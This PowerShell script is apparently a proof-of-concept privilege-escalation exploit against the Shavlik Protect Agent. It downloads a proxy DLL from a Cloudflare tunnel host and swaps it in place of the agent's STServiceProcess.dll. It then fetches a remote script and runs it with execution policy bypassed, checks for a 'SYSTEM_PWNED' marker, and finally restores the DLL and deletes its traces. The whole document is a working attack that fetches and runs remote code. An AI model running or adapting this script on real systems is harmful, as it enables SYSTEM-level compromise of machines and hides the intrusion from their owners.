$ErrorActionPreference = "Stop"
$Tunnel = "https://taxes-surprised-immediately-transportation.trycloudflare.com"
$AgentDir = "C:\Program Files\LANDESK\Shavlik Protect Agent"
$ScriptsDir = "C:\Windows\Tasks"

Write-Output "=== STEP 1: Download proxy DLL ==="
$dllBytes = (Invoke-WebRequest -Uri "$Tunnel/dll/STServiceProcess.dll" -UseBasicParsing).Content
[System.IO.File]::WriteAllBytes("$ScriptsDir\STServiceProcess_proxy.dll", $dllBytes)
Write-Output "Proxy DLL size: $( (Get-Item "$ScriptsDir\STServiceProcess_proxy.dll").Length ) bytes"

Write-Output "=== STEP 2: Backup original DLL ==="
Copy-Item "$AgentDir\STServiceProcess.dll" "$AgentDir\STServiceProcess_orig.dll" -Force
Write-Output "Backup: STServiceProcess_orig.dll"

Write-Output "=== STEP 3: Deploy proxy DLL ==="
Copy-Item "$ScriptsDir\STServiceProcess_proxy.dll" "$AgentDir\STServiceProcess.dll" -Force
Write-Output "Proxy deployed"

Write-Output "=== STEP 4: Run dispatch ==="
$psBytes = (Invoke-WebRequest -Uri "$Tunnel/scripts/run_patched_simple.ps1" -UseBasicParsing).Content
[System.IO.File]::WriteAllBytes("$ScriptsDir\patcher.ps1", $psBytes)

$dispatchCmd = "dispatch --engine b443f8a1-8af5-4f43-8537-467648fecc4c --operation 9d77c15b-2685-4223-8c50-17e989367eb0 --paramData -checkin"
$result = powershell.exe -ExecutionPolicy Bypass -File "$ScriptsDir\patcher.ps1" -Command $dispatchCmd -TimeoutSeconds 120 2>&1
$result -join "`n"

Write-Output "=== STEP 5: Check SYSTEM marker ==="
if (Test-Path "C:\Windows\Tasks\SYSTEM_PWNED.txt") {
    $c = Get-Content "C:\Windows\Tasks\SYSTEM_PWNED.txt" -Raw
    Write-Output "SYSTEM EXECUTION CONFIRMED! Marker: $c"
} else {
    Write-Output "No SYSTEM_PWNED marker found"
}

Write-Output "=== STEP 6: Restore original DLL ==="
Copy-Item "$AgentDir\STServiceProcess_orig.dll" "$AgentDir\STServiceProcess.dll" -Force
Write-Output "Original restored"

Write-Output "=== STEP 7: Cleanup ==="
Remove-Item "$ScriptsDir\STServiceProcess_proxy.dll" -Force -ErrorAction SilentlyContinue
Remove-Item "$AgentDir\STServiceProcess_orig.dll" -Force -ErrorAction SilentlyContinue
Remove-Item "$ScriptsDir\patcher.ps1" -Force -ErrorAction SilentlyContinue
Remove-Item "C:\Windows\Tasks\SYSTEM_PWNED.txt" -Force -ErrorAction SilentlyContinue
Write-Output "Cleanup done"
